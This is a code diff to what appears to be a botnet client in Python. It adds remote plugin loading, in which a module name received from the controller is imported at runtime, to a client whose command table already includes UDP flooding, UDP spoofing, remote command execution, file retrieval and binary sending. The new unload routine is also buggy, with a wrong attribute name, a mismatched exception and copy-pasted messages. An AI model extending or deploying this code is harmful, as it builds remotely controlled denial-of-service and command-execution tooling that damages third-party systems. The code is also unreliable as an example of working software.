@@ -95,9 +95,10 @@ class Client(object):
             cntx = ssl.SSLContext(ssl.PROTOCOL_TLS)
         self.sock = cntx.wrap_socket(self.sock)
         self.address = addr
-        self.port = port
+        self.port = int(port)
         self.quit_signal = False
         self.version = ("%s-%s" %(__version__, "full"))
+        self.plugins = {}
         self.comm_dict = {
             '00000' : 'killMe',
             '00001' : 'getFile',
@@ -107,7 +108,9 @@ class Client(object):
             '00005' : 'udpFlood',
             '00006' : 'udpSpoof',
             '00007' : 'command',
-            '00008' : 'KILL'
+            '00008' : 'KILL',
+            '00009' : 'loadPlugin',
+            '00010' : 'unloadPlugin'
         }
         self.comm_swtch = {
             'killMe'    : self.kill_me,
@@ -117,7 +120,9 @@ class Client(object):
             'sendBinary': self.send_binary,
             'udpFlood'  : self.udp_flood,
             'udpSpoof'  : self.udp_spoof,
-            'command'   : self.run_cm
+            'command'   : self.run_cm,
+            'loadPlugin': self.load_plugin,
+            'unloadPlugin': self.unload_plugin
         }
 
     def loop(self):
@@ -364,6 +369,60 @@ class Client(object):
                 killed = True
         return 0
 
+    def load_plugin(self):
+        """Asyncronously load a plugin."""
+        en_data = self.receive(3) # Max plugin name length 999 chars
+        en_data = self.receive(int(en_data))
+
+        try:
+            self.plugins[en_data] = __import__(en_data)
+            print("%s: plugin loaded." % en_data)
+        except ImportError:
+            print("%s: plugin failed to load or does not exist." % en_data)
+
+    def unload_plugin(self):
+        """Asyncronously load a plugin."""
+        en_data = self.receive(3) # Max plugin name length 999 chars
+        en_data = self.receive(int(en_data))
+
+        try:
+            del self.loaded_plugins[en_data]
+            print("%s: plugin loaded." % en_data)
+        except ImportError:
+            print("%s: plugin failed to load or does not exist." % en_data)
+
+
+class PluginMount(type):
+    """
+    A plugin mount point derived from:
+    http://martyalchin.com/2008/jan/10/simple-plugin-framework/
+    Acts as a metaclass which creates anything inheriting from Plugin
+    """
+
+    def __init__(cls, name, base, attr):
+        """Called when a Plugin derived class is imported
+
+        Gathers all __client_commands__ to __client_cmds__
+        and all __cmd_help__ to __help__
+        Generate __cmd_states__"""
+        if not hasattr(cls, "__client_cmds__"):
+            cls.__client_cmds__ = {}
+
+        tmp = cls()
+        if hasattr(cls, "__client_commands__"):
+            for cmd in tmp.__client_commands__:
+                cls.__client_cmds__[cmd] = tmp.__client_commands__[cmd][0]
+                try:
+                    cls.__cmd_states__[cmd] = tmp.__client_commands__[cmd][1:]
+                except:
+                    print("Command %s is not callable from any state" %cmd)
+                    cls.__cmd_states__[cmd] = []
+        print("%s was loaded" % name)
+
+class Plugin(object):
+    """Plugin class (to be extended by plugins)"""
+    __metaclass__ = PluginMount
+
 
 def main():
     """Main function. Handle object instances."""
@@ -387,3 +446,4 @@ def main():
 if __name__ == '__main__':
     freeze_support()
     Process(target=main).start()
+    print("Process started")
